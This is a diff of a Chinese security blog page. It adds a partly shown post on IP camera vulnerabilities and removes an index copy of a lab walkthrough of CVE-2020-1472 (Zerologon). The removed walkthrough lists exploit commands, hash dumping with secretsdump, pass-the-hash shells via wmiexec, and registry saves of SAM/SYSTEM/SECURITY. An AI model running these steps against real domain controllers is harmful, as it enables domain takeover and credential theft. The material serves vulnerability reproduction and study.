@@ -20,31 +20,47 @@
     var CONFIG = {"hostname":"ithedogl.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="笑一个">
-<meta property="og:type" content="website">
-<meta property="og:title" content="沉沦">
-<meta property="og:url" content="https://ithedogl.github.io/index.html">
+  <meta name="description" content="摄像头1.摄像头基础知识1.1 网络摄像头类型网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。 数字视频录像机 (DVR&#x2F;NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储 中央闭路电视 (CCT">
+<meta property="og:type" content="article">
+<meta property="og:title" content="摄像头">
+<meta property="og:url" content="https://ithedogl.github.io/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/index.html">
 <meta property="og:site_name" content="沉沦">
-<meta property="og:description" content="笑一个">
+<meta property="og:description" content="摄像头1.摄像头基础知识1.1 网络摄像头类型网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。 数字视频录像机 (DVR&#x2F;NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储 中央闭路电视 (CCT">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150235066.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220150323351.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220153731462.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220160326388.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161019296.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220161721889.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220162108549.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210426597.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png">
+<meta property="og:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png">
+<meta property="article:published_time" content="2021-04-01T12:55:01.490Z">
+<meta property="article:modified_time" content="2021-04-01T13:17:14.095Z">
 <meta property="article:author" content="thedog">
-<meta property="article:tag" content="thedog">
+<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="摄像头">
+<meta property="article:tag" content="硬件">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ithedogl.github.io/images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20200220145757392.png">
 
-<link rel="canonical" href="https://ithedogl.github.io/">
+<link rel="canonical" href="https://ithedogl.github.io/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>沉沦</title>
+  <title>摄像头 | 沉沦</title>
   
 
 
@@ -171,9 +187,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -189,10 +206,9 @@
       <meta itemprop="name" content="沉沦">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/01/%E6%91%84%E5%83%8F%E5%A4%B4/" class="post-title-link" itemprop="url">摄像头</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          摄像头
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -230,7 +246,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p>
+        <h1 id="摄像头"><a href="#摄像头" class="headerlink" title="摄像头"></a>摄像头</h1><h3 id="1-摄像头基础知识"><a href="#1-摄像头基础知识" class="headerlink" title="1.摄像头基础知识"></a>1.摄像头基础知识</h3><h5 id="1-1-网络摄像头类型"><a href="#1-1-网络摄像头类型" class="headerlink" title="1.1 网络摄像头类型"></a>1.1 网络摄像头类型</h5><p>网络摄像头 (IPCam)：由视频服务器和摄像头的集成,通常是 linux 系统, 内置一个 web server,画面实时传输, 一般没有视频存储功能。</p>
 <p>数字视频录像机 (DVR/NVR)：进行图像存储处理, 可录像, 录音, 远程监控等等,大概分为 PC 式和嵌入式, 操作系统不固定,只要处理设备装有处理软件即可, 视频存储</p>
 <p>中央闭路电视 (CCTV)：图像通信系统和 DVR/NVR 结合起来, 通过双绞线、光缆、网络接收图像信号, 监控室里常见</p>
 <p>监控云平台：通过云平台集中管理多个设备</p>
@@ -293,171 +309,42 @@
 <p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210448193.png" alt="image-20210401210448193"></p>
 <p><img src="/../../../../images/%E6%91%84%E5%83%8F%E5%A4%B4/image-20210401210543504.png" alt="image-20210401210543504"></p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag"># 漏洞复现</a>
+              <a href="/tags/%E6%91%84%E5%83%8F%E5%A4%B4/" rel="tag"># 摄像头</a>
+              <a href="/tags/%E7%A1%AC%E4%BB%B6/" rel="tag"># 硬件</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://ithedogl.github.io/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
+        
 
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="thedog">
-      <meta itemprop="description" content="笑一个">
-    </span>
 
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="沉沦">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">cve-2020-1472域内提权漏洞</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-29 23:33:28" itemprop="dateCreated datePublished" datetime="2021-03-29T23:33:28+08:00">2021-03-29</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-30 00:36:25" itemprop="dateModified" datetime="2021-03-30T00:36:25+08:00">2021-03-30</time>
-              </span>
-
-          
-  
-  <span class="post-meta-item">
-    
-      <span class="post-meta-item-icon">
-        <i class="far fa-comment"></i>
-      </span>
-      <span class="post-meta-item-text">Valine：</span>
-    
-    <a title="valine" href="/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CVE-2020-1472是微软八月修复的一个严重的权限提升漏洞(并于昨天2020年9月15日secura发布了相关的漏洞细节，随后相关exp被构造发布)，通过Netlogon 远程协议 (MS-NRPC) 建立与域控制器连接安全通道时，存在特权提升的利用点，该漏洞的CVSS分高达10分，攻击者只需要在内网中有一个立足点，就可以远程获取域控的管理员权限。</p>
-<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1</span><br><span class="line">Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation)</span><br><span class="line">Windows Server 2012</span><br><span class="line">Windows Server 2012 (Server Core installation)</span><br><span class="line">Windows Server 2012 R2</span><br><span class="line">Windows Server 2012 R2 (Server Core installation)</span><br><span class="line">Windows Server 2016</span><br><span class="line">Windows Server 2016 (Server Core installation)</span><br><span class="line">Windows Server 2019</span><br><span class="line">Windows Server 2019 (Server Core installation)</span><br><span class="line">Windows Server, version 1903 (Server Core installation)</span><br><span class="line">Windows Server, version 1909 (Server Core installation)</span><br><span class="line">Windows Server, version 2004 (Server Core installation)</span><br></pre></td></tr></table></figure>
-
-<h1 id="利用步骤"><a href="#利用步骤" class="headerlink" title="利用步骤"></a>利用步骤</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.通过漏洞脚本置空域控保存在AD中的密码</span><br><span class="line">2.通过secretsdump.py获取域控上的用户hash</span><br><span class="line">3.通过该hash使用wmiexec.py登录域控获取一个shell</span><br><span class="line">4.通过shell获取本地保存的原hash key</span><br><span class="line">5.通过获取的hash key恢复置空的域控密码</span><br></pre></td></tr></table></figure>
-
-<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p> 利用脚本</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;dirkjanm&#x2F;CVE-2020-1472	#域控保存在AD的密码置空，对域控有影响，要及时恢复</span><br><span class="line">https:&#x2F;&#x2F;github.com&#x2F;risksense&#x2F;zerologon		#恢复脚本</span><br></pre></td></tr></table></figure>
-
-<p>除了上述脚本之外，还要用到python3下impacket模块中的secretsdump.py和wmiexec.py</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">secretsdump.py	#置空域控hash后，获取其他用户hash</span><br><span class="line">wmiexec.py	#用获得的用户hash登录上去，获得一个shell</span><br></pre></td></tr></table></figure>
-
-<p>这里对版本有要求，python3.7以上，impacket版本v0.9.22.dev1以上</p>
-<p>我实验的时候用的kali做攻击机，impacket模块中两个脚本的路径是<kbd>/usr/share/doc/python3-impacket/examples</kbd>，要查看版本随便运行一个文件就可以看到</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127111729607.png" alt="image-20210127111729607"></p>
-<p>新版impacket包下载地址<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
-<p>下载后进入目录运行<kbd>sudo pip3 install .</kbd>即可安装新版impacket模块。如果没有pip3，按照以下方法安装pip3。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">下载https:&#x2F;&#x2F;bootstrap.pypa.io&#x2F;get-pip.py</span><br><span class="line">python3 get-pip.py</span><br><span class="line">pip3 -V </span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127112246983.png" alt="image-20210127112246983"></p>
-<p>都准备就绪后就可以开始实验了，环境如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">攻击机kali	192.168.154.128</span><br><span class="line">边界机win7	192.168.154.130	192.168.52.143</span><br><span class="line">域控server08	192.168.52.138</span><br></pre></td></tr></table></figure>
-
-<p>kali作为cs服务端，获取边界机的会话后设置代理24446端口</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113026628.png" alt="image-20210127113026628"></p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113108084.png" alt="image-20210127113108084"></p>
-<p>配置代理后，kali就可以访问域控了。OWA是域控主机名，可通过cs端口扫描到。也可在system权限下通过命令查找域控信息。</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127113652512.png" alt="image-20210127113652512"></p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114005936.png" alt="image-20210127114005936"></p>
-<p>这里先用cve-2020-1472-exploit.py置空域控保存在AD中的密码。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 cve-2020-1472-exploit.py OWA 192.168.52.138</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114042552.png" alt="image-20210127114042552"></p>
-<p>查看域内用户hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 secretsdump.py god.org&#x2F;OWA\$@192.168.52.138 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114555661.png" alt="image-20210127114555661"></p>
-<p>通过wmiexec获取到Shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py god.org&#x2F;administrator@192.168.52.138 -hashes aad3b435b51404eeaad3b435b51404ee:3f589ddca9ecc4534635e8d432b5c541</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127114814615.png" alt="image-20210127114814615"></p>
-<p>接下来就是恢复hash了，命令如下</p>
-<p>先备份注册表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115248808.png" alt="image-20210127115248808"></p>
-<p>退出后可以看到多出三个文件</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115405538.png" alt="image-20210127115405538"></p>
-<p>使用secretsdump解析保存在本地的nt hash</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127115532747.png" alt="image-20210127115532747"></p>
-<p>恢复原hash，这一步比较久</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 reinstall_original_pw.py OWA 192.168.52.138 8e3ee83b233ce68699a27b6aa9c196dd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120102589.png" alt="image-20210127120102589"></p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120119842.png" alt="image-20210127120119842"></p>
-<p>此时想再查看域内用户hash就会失败了</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120322059.png" alt="image-20210127120322059"></p>
-<p>但是因为之前拿到了administrator的hash，可以再用wmiexec获得shell。</p>
-<p><img src="/../../../../images/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/image-20210127120520658.png" alt="image-20210127120520658"></p>
-<p>回顾一个整个过程，利用1472漏洞把域控保存在AD中的密码置空，置空后用secretsdump.py的-no-pass获取域控administrator的hash，再用wmiexec.py和admin的hash登录到域控获得一个shell，通过shell获取本地保存的原hash key，最后通过获取的hash key恢复置空的域控密码，过程中得到的admin的hash仍然可以用于登录域控。</p>
-<p>争议：恢复原密码所用到的hash，看文章也有说是$MACHINE.ACC:plain_password_hex中的值</p>
-<p>参考：</p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/goabout2/p/13676527.html">https://www.cnblogs.com/goabout2/p/13676527.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/sup3rman/p/13680262.html">https://www.cnblogs.com/sup3rman/p/13680262.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html">https://www.cnblogs.com/Mikasa-Ackerman/p/CVE20201472.html</a></p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/29/cve-2020-1472%E5%9F%9F%E5%86%85%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/" rel="prev" title="cve-2020-1472域内提权漏洞">
+      <i class="fa fa-chevron-left"></i> cve-2020-1472域内提权漏洞
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-
   
 
 
 
           </div>
           
+    <div class="comments" id="valine-comments"></div>
 
 <script>
   window.addEventListener('tabs:register', () => {
@@ -504,6 +391,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%91%84%E5%83%8F%E5%A4%B4"><span class="nav-number">1.</span> <span class="nav-text">摄像头</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%91%84%E5%83%8F%E5%A4%B4%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">1.0.1.</span> <span class="nav-text">1.摄像头基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#1-1-%E7%BD%91%E7%BB%9C%E6%91%84%E5%83%8F%E5%A4%B4%E7%B1%BB%E5%9E%8B"><span class="nav-number">1.0.1.0.1.</span> <span class="nav-text">1.1 网络摄像头类型</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-2-%E5%B8%B8%E8%A7%81%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95"><span class="nav-number">1.0.1.0.2.</span> <span class="nav-text">1.2 常见攻击方法</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#1-3-%E5%B8%B8%E8%A7%81%E5%BC%B1%E5%8F%A3%E4%BB%A4"><span class="nav-number">1.0.1.0.3.</span> <span class="nav-text">1.3 常见弱口令</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E6%91%84%E5%83%8F%E5%A4%B4%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.0.2.</span> <span class="nav-text">2. 摄像头漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#2-1-DVR%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87-CVE-2018-9995"><span class="nav-number">1.0.2.0.1.</span> <span class="nav-text">2.1 DVR登录绕过 CVE-2018-9995</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-2-JAWS%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="nav-number">1.0.2.0.2.</span> <span class="nav-text">2.2 JAWS登录绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#2-3-D-Link-DCS%E7%B3%BB%E5%88%97%E7%9B%91%E6%8E%A7-%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E6%BC%8F%E6%B4%9E-CVE-2020-25078"><span class="nav-number">1.0.2.0.3.</span> <span class="nav-text">2.3 D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
